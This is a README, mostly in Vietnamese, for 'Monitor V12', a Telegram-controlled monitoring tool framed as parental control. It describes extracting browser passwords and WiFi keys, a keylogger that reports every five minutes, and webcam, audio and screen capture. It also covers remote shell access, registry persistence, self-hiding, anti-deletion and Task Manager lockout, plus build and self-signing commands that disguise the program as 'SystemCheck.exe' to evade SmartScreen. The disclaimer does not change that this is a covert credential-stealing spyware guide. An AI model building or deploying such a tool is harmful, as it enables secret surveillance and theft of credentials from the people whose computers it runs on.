-----

# 🛡️ MONITOR V12 - PARENTAL CONTROL TOOL - PERSONAL SYSTEM ADMINISTRATION

> **Developer:** TsByin  
> **Version:** 12.0 (Hardened, Full-Featured & Optimized)

Công cụ quản lý và giám sát máy tính từ xa qua Telegram Bot. V12 bổ sung: sửa 13 lỗi bảo mật, file explorer phân trang, ghi video MP4 tùy chỉnh, watchdog tự khởi động lại, keylogger quản lý con cái có window-aware, lưu trạng thái qua restart, audit log, dashboard /status, /disk, /ps filter, /net, /events, clipboard monitor, remote desktop lite (/stream), hot-reload /reload.

> **⚠️ LƯU Ý PHÁP LÝ:** Công cụ này được thiết kế cho mục đích **Quản lý con cái** hoặc **Quản trị hệ thống cá nhân**. Việc sử dụng công cụ này để theo dõi máy tính của người khác mà không có sự đồng ý là vi phạm pháp luật. Tác giả không chịu trách nhiệm về bất kỳ hành vi sử dụng sai mục đích nào.

---

## 📁 CẤU TRÚC DỰ ÁN 

```
V12/
├── Core Modules (9 files)
│   ├── V12.py          - Main bot entry (~1350+ dòng) ⭐
│   ├── config.py       - Cấu hình & logging
│   ├── utils.py        - Tiện ích hệ thống, audit log, settings
│   ├── grabber.py      - Trích xuất password/history (concurrent)
│   ├── media.py        - Screen/webcam/audio capture, MP4
│   ├── monitor.py      - Background daemon + BotStats + ClipMonitor
│   ├── watchdog.py     - Tự khởi động lại khi crash (NEW)
│   ├── keylogger.py    - Keylogger window-aware (NEW)
│   └── verify_setup.py - Kiểm tra cài đặt
│
├── Configuration
│   ├── .env            - Token & cài đặt (REQUIRED)
│   ├── requirements.txt - Dependencies
│   ├── settings.json   - State persist tự tạo (block/taskmgr/alert/clipboard)
│   ├── blocked.json    - Danh sách chặn tự tạo
│   └── audit.log       - Audit trail tự tạo
│
└── Build & Docs
    ├── dist/           - Folder EXE đã biên dịch
    ├── README.md       - File này
    ├── ARCHITECTURE.md - Kiến trúc hệ thống
    ├── LOGIC_FLOWS.md  - Sơ đồ luồng chi tiết
    ├── QUICK_START.md  - Hướng dẫn nhanh
    └── BUILD_EXE.md    - Hướng dẫn build EXE
```

**V12 Architecture (Hardened & Full-Featured):**
- ✅ Modular design (9 modules + 1 main entry point)
- ✅ .env-based secure configuration (không hardcode secrets)
- ✅ Concurrent password extraction (ThreadPoolExecutor — 2-3x faster)
- ✅ Multi-file password/history output (tất cả profiles tất cả browsers)
- ✅ Background monitor daemon (CPU/motion alerts, clipboard monitor)
- ✅ Watchdog process tự khởi động lại khi crash (Task Scheduler)
- ✅ Keylogger window-aware và tự gửi qua Telegram mỗi 5 phút
- ✅ State persistence — lưu/khôi phục trạng thái sau restart
- ✅ Audit log mọi lệnh được thực thi
- ✅ Remote desktop lite (/stream)
- ✅ Hot-reload cấu hình (/reload)
- ✅ Text-based ReplyKeyboard + 21 slash commands tự đăng ký
- ✅ File browser phân trang, per-item buttons (xem/tải/xóa/upload)
- ✅ Logging đầy đủ ra bot.log

-----

## ✨ TÍNH NĂNG CHÍNH

### 1️⃣ 📡 Real-time Monitoring

  * **Webcam Capture:** Chụp ảnh từ camera trước.
  * **Screenshot:** Chụp màn hình, gửi PNG chất lượng gốc (không nén Telegram).
  * **Screen Record:** Quay màn hình N giây xuất MP4 (`/record [N]`, mặc định 10s, 20 FPS).
  * **Audio Record:** Ghi âm môi trường N giây (`/audio [N]`, mặc định 10s).
  * **Remote Desktop Lite:** Stream màn hình mỗi N giây qua Telegram (`/stream [N]`, `/stream stop`).
  * **Process Manager:** Xem/lọc process, Force Kill (`/ps [filter]`, `/kill <pid>`).
  * **System Info:** CPU, RAM, Disk, Battery, Network, IP.
  * **System Dashboard:** Overview nhanh qua `/status`; chi tiết đĩa/pin qua `/disk`; mạng qua `/net`; Windows Event Log qua `/events`.

### 2️⃣ 🚫 Access Control

  * **Block Websites:** Hosts đa biến thể (domain/www/m, IPv4/IPv6) + Firewall FQDN/IP, refresh IP định kỳ, chặn port 80/443 ở rule IP.
  * **Block Apps:** Chặn nhiều app trong một lệnh; kill theo tên + cmdline (Control Panel/Settings/rundll32 .cpl).
  * **Input Locking:** Khóa bàn phím + chuột từ xa.
  * **TaskMgr Lock:** Khóa Task Manager / Registry Editor.
  * **Disk Access:** Kiểm soát quyền truy cập ổ đĩa (NTFS).
  * **Power Control:** Shutdown/Restart có bước xác nhận (inline buttons).

### 3️⃣ 📂 Trích Xuất Dữ Liệu (Data Extraction)

  * **🔑 Extract Passwords:** 
    - Giải mã mật khẩu từ Chrome, Edge, Firefox, Cốc Cốc...
    - Trích xuất TỪ TẤT CẢ các profile trong mỗi trình duyệt.
    - Tạo file riêng cho mỗi profile + file tóm tắt chung.
    - Gzip compress để giảm kích thước.
  
  * **🌐 Extract Browser History:**
    - Trích xuất lịch sử web từ tất cả profiles, tất cả browsers.
    - Limit dữ liệu (500 trang mới nhất).
    - Include timestamp, title, URL trong output.
  
  * **📶 Extract WiFi:**
    - Lấy danh sách WiFi đã lưu.
    - Ghi mật khẩu WiFi thành plain text.
  
  * **📋 Clipboard:**
    - Đọc text (tự lưu file nếu quá dài).
    - Liệt kê file trong clipboard.
    - Đọc ảnh từ clipboard (gửi PNG).

### 4️⃣ 📂 File Management (Explorer)

  * **Duyệt File:** Xem danh sách file/folder theo đường dẫn.
  * **Tải Về:** Download file từ máy tính.
  * **Upload:** Upload file lên máy (< 20MB).
  * **Xóa:** Xóa file/folder.

### 5️⃣ 💬 Remote Command Execution

  * **Shell Commands:** Chạy lệnh shell whitelist và lấy output (`/cmd <lệnh>`, `/cmdlist` để xem danh sách).
  * **Text-to-Speech:** Phát giọng nói qua loa máy (`/say [--rate N] [--voice f|m] <text>`).
  * **Message Box:** Hiển thị thông báo popup trên màn hình (`/msg <nội dung>`).
  * **Hot-Reload:** Tải lại cấu hình `.env` ngay lập tức mà không cần restart bot (`/reload`).

### 6️⃣ 🛡️ Cơ Chế Tự Vệ & Ẩn Danh (Anti-Detection)

  * **Persistence:** Tự động khởi động cùng Windows (thêm vào Registry).
  * **Self-Hiding:** Tự động đóng cửa sổ folder nếu người dùng tìm thấy.
  * **Folder Protection:** Chống xóa bằng NTFS Access Denied.
  * **Auto-Reconnect:** Tự động kết nối lại nếu bị disconnect.
  * **Stealth Mode:** Chạy ngầm không có console (--noconsole).

### 7️⃣ 🔑 Keylogger Management

  * **Window-Aware Keylogger:** Ghi phím kết hợp với tên cửa sổ đang active.
  * **Auto-Send:** Tự động gửi keylog qua Telegram mỗi 5 phút.
  * **Toggle:** Bật/tắt keylogger từ menu mà không cần restart.
  * **Safe Fallback:** Nếu `pynput` không cài, keylogger tự tắt — không crash bot.

### 8️⃣ 📊 System Dashboard & Audit (V12 NEW)

  * **State Persistence:** Trạng thái block/taskmgr/alert/clipboard tự lưu vào `settings.json` → khôi phục sau restart.
  * **Audit Log:** Mọi lệnh thực thi được ghi vào `audit.log` kèm timestamp (xem qua `/auditlog [N]`).
  * **Bot Commands Auto-Register:** 22 lệnh slash tự đăng ký vào Telegram khi bot khởi động.
  * **Hot-Reload Config:** Chỉnh `.env` rồi gửi `/reload` → bot cập nhật ngay không cần restart.
  * **Clipboard Monitor:** Tự động theo dõi clipboard và gửi cảnh báo khi có nội dung mới (`/clipmon`).

-----

## 🛠️ YÊU CẦU HỆ THỐNG

  * **OS:** Windows 10/11 (64-bit).
  * **Python:** 3.8 trở lên.
  * **Quyền:** Administrator (Bắt buộc để chặn Web và ghi Registry).

-----

## 🚀 CÀI ĐẶT MÔI TRƯỜNG (Dev)

Chạy lần lượt các lệnh sau trong CMD để cài đặt thư viện:

```bash
# 1. Cài đặt công cụ hỗ trợ binary
pip install pipwin

# 2. Cài đặt thư viện âm thanh (Thường hay lỗi nếu cài thường)
pipwin install pyaudio

# 3. Cài đặt các thư viện còn lại từ file requirements
pip install -r requirements.txt
```

-----

## ⚙️ CẤU HÌNH (Config)

Cấu hình được quản lý thông qua file `.env` (an toàn hơn):

### Bước 1: Tạo file `.env`

Tạo file `.env` trong thư mục gốc (cùng với V12.py):

```bash
API_TOKEN=YOUR_TELEGRAM_BOT_TOKEN
ADMIN_ID=123456789
MONITOR_INTERVAL=1
CPU_ALERT_THRESHOLD=95
CPU_ALERT_COOLDOWN=300
MOTION_DETECT_AREA=3000
```

### Bước 2: Lấy Telegram Token & Admin ID

1. **Token:** Nhắn `/newbot` cho @BotFather trên Telegram
2. **Admin ID:** Nhắn `/start` cho @userinfobot để lấy ID của bạn

### Bước 3: Xác minh Config

Chạy lệnh kiểm tra:

```bash
python verify_setup.py
```

Hoặc kiểm tra nhanh:

```bash
python -c "from config import API_TOKEN, ADMIN_ID; print(f'✅ Config OK — Token: {API_TOKEN[:10]}..., Admin: {ADMIN_ID}')"
```

-----

## 📦 ĐÓNG GÓI & TRIỂN KHAI (Build EXE)

### Bước 1: Chuẩn bị file .env

Đảm bảo file `.env` có đầy đủ cấu hình (xem mục Config ở trên).

### Bước 2: Build file EXE

Sử dụng PyInstaller để đóng gói thành 1 file duy nhất, chạy ngầm:

```bash
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V12.py
```*File kết quả sẽ nằm trong thư mục `dist/SystemCheck.exe`.*

**Lưu ý:** File `.env` phải ở cùng thư mục với `SystemCheck.exe`

### Bước 3: Ký Chữ Ký Số (Code Signing) - Optional

Chạy **PowerShell (Admin)** để ký file giúp tránh màn hình xanh SmartScreen.

```powershell
# 1. Tạo chứng chỉ (Nếu chưa có)
$cert = New-SelfSignedCertificate -DnsName "SystemCheck" -CertStoreLocation "Cert:\CurrentUser\My" -Type CodeSigningCert
# Trust chứng chỉ
$rootStore = New-Object System.Security.Cryptography.X509Certificates.X509Store([System.Security.Cryptography.X509Certificates.StoreName]::Root, "CurrentUser")
$rootStore.Open("ReadWrite"); $rootStore.Add($cert); $rootStore.Close()

# 2. Ký vào file EXE
Set-AuthenticodeSignature -Certificate $cert -FilePath "dist\SystemCheck.exe"

# 3. Xuất file chứng chỉ (Để cài sang máy khác)
Export-Certificate -Cert $cert -FilePath "dist\Cert.cer"
```

-----

## 📖 HƯỚNG DẪN SỬ DỤNG (Telegram)

### Interface (Text-based ReplyKeyboard)

Khi gõ `/start` hoặc `/menu`, bot sẽ hiển thị menu với các nút như:

```
🔑 Lấy Passwords          🌐 Lịch Sử Web
🖼️ Chụp Màn Hình         📸 Webcam
🎤 Ghi Âm (10s)          🎥 Quay MH (10s)
🚫 Chặn App/Web          🔒 Khóa TaskMgr
⚙️ QL Tiến Trình         🚀 Chạy Lệnh
🔄 Khởi động lại         🛑 Tắt máy
📂 Duyệt File            🚨 Cảnh Báo (Toggle)
📶 Wi-Fi                 📋 Clipboard
📍 Vị Trí IP             🧱 Khóa Input
💓 Kiểm Tra Bot
```

**Chỉ cần bấm các nút để thực hiện lệnh - không cần gõ text phức tạp.**

### Các lệnh Slash (V12 — 22 commands):

| Lệnh | Mô tả |
| :--- | :--- |
| `/start` hoặc `/menu` | Mở Menu điều khiển chính |
| `/help` | Xem hướng dẫn chi tiết |
| `/status` | Dashboard hệ thống (CPU/RAM/Disk/Battery/Net) |
| `/stats` | Thống kê bot (uptime, số lệnh đã chạy) |
| `/disk` | Chi tiết ổ đĩa & trạng thái pin |
| `/ps [filter]` | Danh sách tiến trình (tùy chọn lọc theo tên) |
| `/net` | Snapshot mạng (interfaces, IO, TCP connections) |
| `/events` | 10 Windows System Event Log mới nhất |
| `/stream [N]` | Phát màn hình mỗi N giây (default 5s) |
| `/stream stop` | Dừng stream màn hình |
| `/record [N]` | Quay màn hình N giây, xuất MP4 |
| `/audio [N]` | Ghi âm N giây (default 10s) |
| `/cmd <lệnh>` | Chạy lệnh shell (whitelist) |
| `/cmdlist` | Xem danh sách lệnh shell được phép |
| `/msg <nội dung>` | Hiển thị thông báo popup trên màn hình |
| `/say [--rate N] [--voice f\|m] <text>` | TTS phát giọng nói qua loa |
| `/block app\|site <tên…>` | Chặn nhiều app/website |
| `/unblock app\|site <tên…>` | Gỡ chặn app/website |
| `/kill <pid>` | Kết thúc tiến trình theo PID |
| `/clipmon` | Toggle tự động giám sát clipboard |
| `/reload` | Hot-reload cấu hình từ `.env` không cần restart |
| `/auditlog [N]` | Xem N dòng audit log gần nhất (default 20) |
| `/list` | Liệt kê app/web đang bị chặn |

### Công Dụng Từng Nút Menu:

**🔑 Lấy Passwords:**
- Trích xuất ALL mật khẩu từ tất cả browsers (Chrome, Edge, Firefox, Cốc Cốc...).
- Bao gồm tất cả profiles trong mỗi browser.
- Nhận file `.txt` nén gzip với định dạng: `[Browser] [Profile] [Username]:[Password]`.

**🌐 Lịch Sử Web:**
- Trích xuất lịch sử web từ tất cả browsers + tất cả profiles.
- Giới hạn 500 trang gần nhất.
- Format: `[Timestamp] [Title] [URL]`.

**🖼️ Chụp Màn Hình:**
- Chụp toàn bộ màn hình hiện tại.
- Gửi file PNG chất lượng gốc (không bị nén bởi Telegram).

**📸 Webcam:**
- Chụp 1 ảnh từ camera trước máy.
- Gửi ảnh về Telegram.

**🎤 Ghi Âm (10s):**
- Ghi âm 10 giây từ mic máy.
- Gửi file voice message về Telegram.

**🎥 Quay MH (10s):**
- Quay video màn hình 10 giây (đủ 10s bằng frame count).
- Gửi file video về Telegram.

**🚫 Chặn App/Web:**
- Thêm/xóa nhiều app/web trong một lệnh.
- Nếu bật: tự động kill app (tên + cmdline), block web qua hosts + firewall, refresh IP định kỳ.

**🔒 Khóa TaskMgr:**
- Bật/tắt khóa Task Manager.
- Người dùng không thể mở nó để xóa bot.

**⚙️ QL Tiến Trình:**
- Xem danh sách tất cả process đang chạy.
- Có thể force kill process từ menu.

**🚀 Chạy Lệnh:**
- Gợi ý dùng `/cmd <lệnh>` thay vì bấm nút.
- Chạy CMD command và lấy output.

**🔄 Khởi động lại:**
- Reboot máy tính (sau 10 giây).

**🛑 Tắt máy:**
- Shutdown máy tính (sau 10 giây).

**📂 Duyệt File:**
- Duyệt file system từ C:\ hoặc folder khác.
- Xem file, download, upload.

**🚨 Cảnh Báo (Toggle):**
- Bật/tắt motion detection + CPU alert.

**📶 Wi-Fi:**
- Lấy danh sách WiFi đã lưu.
- In ra SSID + mật khẩu plain text.

**📋 Clipboard:**
- Đọc text (dài -> file), danh sách file, ảnh từ clipboard.

**📍 Vị Trí IP:**
- Lấy IP local + public của máy.
- Geolocate IP address.

**🧱 Khóa Input:**
- Khóa bàn phím + chuột (người dùng không thể tương tác).

**💓 Kiểm Tra Bot:**
- Xem trạng thái bot: Online, Uptime, CPU%, RAM%, TaskMgr status.

### Ví Dụ Sử Dụng:

1. **Chặn Facebook:**
   - Bấm nút `🚫 Chặn App/Web`
   - Hoặc gõ `/block site facebook.com`

2. **Ghi âm + chụp webcam:**
   - Bấm `🎤 Ghi Âm (10s)` (chờ 10s)
   - Bấp `📸 Webcam`
   - Nhận 2 file.

3. **Chạy command:**
   - Gõ `/cmd tasklist /v` để xem danh sách process chi tiết.

### Chặn Settings & Control Panel:

Để chặn người dùng gỡ cài đặt hoặc chỉnh hệ thống:

1. `/block app SystemSettings.exe` (Chặn Settings)
2. `/block app control.exe` (Chặn Control Panel)
3. Bấm nút **🚫 Chặn App/Web** để kích hoạt chặn.

Khi kích hoạt:
- Các app/web bị chặn sẽ bị kill nếu chạy.
- Danh sách block được lưu vào `blocked.json`.

-----

## ❓ XỬ LÝ SỰ CỐ (Troubleshooting)

**1. Bot không online / Error 409 - Conflict?**

**Nguyên nhân:** Bot đang chạy 2 instance cùng lúc (hoặc chạy 2 file .py cùng token).

**Cách sửa:**
- Tắt tất cả Python processes: `taskkill /f /im python.exe`
- Đảm bảo chỉ 1 file bot.py chạy ở một thời điểm.
- Nếu dùng EXE, đóng EXE cũ trước khi chạy cái mới.

**2. Bot không nhận được token / "API_TOKEN not found"?**

**Cách sửa:**
- Kiểm tra file `.env` có tồn tại trong cùng folder với `SystemCheck.exe`.
- Đảm bảo `.env` có dòng: `API_TOKEN=YOUR_TOKEN_HERE` (không có space).
- Nếu chạy source code: `.env` phải ở cùng folder với `V12.py`.
- Chạy test: `python -c "from config import API_TOKEN; print(API_TOKEN[:10])"`

**3. Không chặn được Website?**

**Cách sửa:**
- Bot phải chạy với quyền **Administrator** (Run as Admin).
- Một số browser dùng *Secure DNS (DoH)*, cần tắt trong settings.
- Kiểm tra file Hosts: `C:\Windows\System32\drivers\etc\hosts`.
- Chạy lệnh flush DNS: `/cmd ipconfig /flushdns`.

**4. Không chặn được App?**

**Cách sửa:**
- Dùng tên chính xác của exe (VD: `chrome.exe` không phải `Chrome`).
- Kiểm tra process name: Bấm nút `⚙️ QL Tiến Trình` để xem danh sách.
- Bật chặn: Bấm `🚫 Chặn App/Web`.

**5. Không thể xóa/update file EXE hoặc folder?**

**Nguyên nhân:** Cơ chế chống xóa (NTFS permission) đang bật.

**Cách sửa:**
- Gửi lệnh đặc biệt reset quyền:
  ```
  /cmd icacls "%APPDATA%\Microsoft\Windows\SystemMonitor" /reset /T
  ```
- Sau đó tắt bot hoàn toàn (kể cả watchdog) bằng lệnh:
  ```
  /stop
  ```
  > ⚠️ **Không dùng** `/cmd taskkill` — lệnh đó bị chặn bởi whitelist. Dùng `/stop` để tắt bot đúng cách.
- Bây giờ có thể xóa folder.

**6. Webcam / Audio không hoạt động?**

**Cách sửa:**
- Kiểm tra driver camera/mic: Device Manager.
- Cho phép quyền camera: Settings > Privacy > Camera.
- Chạy test: Bấp nút `📸 Webcam` hoặc `🎤 Ghi Âm`.

**7. Screenshot bị lỗi hoặc file quá lớn?**

**Nguyên nhân:** Màn hình độ phân giải cao.

**Cách sửa:**
- Bot tự động nén JPEG, nhưng có thể chậm.
- Chạy lệnh kiểm tra: `/cmd tasklist` (là command đơn giản hơn để test).

**8. File history/password không nhận được?**

**Cách sửa:**
- Đảm bảo browser đã lưu password/history (vào browser -> Settings -> Passwords).
- Chạy trực tiếp từ source: `python V12.py` để xem lỗi chi tiết.
- Kiểm tra log: `bot.log` trong folder chạy.

**9. Bot bị tắt đột ngột?**

**Cách sửa:**
- Kiểm tra `bot.log` để xem error.
- Bật Persistence: Bấm nút (bot tự thêm vào startup).
- Kiểm tra Windows Defender: Có thể block python.exe.

**10. Kiểm Tra Bot Offline / Lag?**

**Cách sửa:**
- Bấp nút `💓 Kiểm Tra Bot` để xem trạng thái live.
- Kiểm tra mạng: `/cmd ping google.com`.
- Restart bot: Tắt và chạy lại file.

-----

## 📋 YÊU CẦU & NOTES

### Yêu Cầu Cơ Bản:

- **OS:** Windows 10/11 (64-bit, không hỗ trợ 32-bit).
- **Python:** 3.8+ (nếu chạy source), 3.13 (recommend).
- **Quyền:** Administrator (bắt buộc cho chặn web, lock input, registry).
- **Mạng:** Internet stable (Telegram API cần kết nối).

### Giới Hạn & Lưu Ý:

- **File size:** Max 20MB upload/download qua Telegram.
- **Timeout:** Command tối đa 30 giây, nếu quá lâu sẽ timeout.
- **Concurrent:** Max 4 thread chạy cùng lúc (ThreadPoolExecutor).
- **Compression:** Password/history file được gzip compress tự động.
- **Logging:** Tất cả action log vào `bot.log` trong folder chạy.

### Bảo Mật & Pháp Lý:

- **⚠️ CẢNH BÁO:** Công cụ này chỉ cho phép sử dụng trên **máy của bạn** hoặc **máy con cái** (với sự đồng ý của cha mẹ).
- **Không sử dụng** trên máy người khác mà không được phép - **VI PHẠM PHÁP LUẬT**.
- Token Telegram phải bảo mật (không chia sẻ file `.env`).
- Log file (`bot.log`) có thể chứa dữ liệu nhạy cảm.

-----

## 🔧 TECHNICAL SPECS

- **Modular Design:** 9 modules + 1 main entry point (`V12.py`).
- **Concurrency:** ThreadPoolExecutor cho password extraction (2-3x faster).
- **Password Extraction:** Decryption Chrome/Edge/Firefox/Cốc Cốc — tất cả profiles.
- **Watchdog Process:** Task Scheduler tự khởi động lại bot khi crash.
- **Keylogger:** Window-aware (pynput), tự gửi Telegram mỗi 5 phút.
- **State Persistence:** `settings.json` lưu block/taskmgr/alert/clipboard qua restart.
- **Audit Log:** Mọi lệnh ghi vào `audit.log` với timestamp.
- **Anti-Debug:** Folder protection + NTFS permission lock.
- **Persistence:** Registry HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
- **Stealth:** --noconsole, auto-hide folder, background monitoring.
- **Config:** .env file (secure) thay vì hardcoded values.

-----

**Developer:** TsByin  
**Version:** 12.0 (Hardened, Full-Featured & Optimized)  
**Last Updated:** March 2026  
**License:** Personal Use Only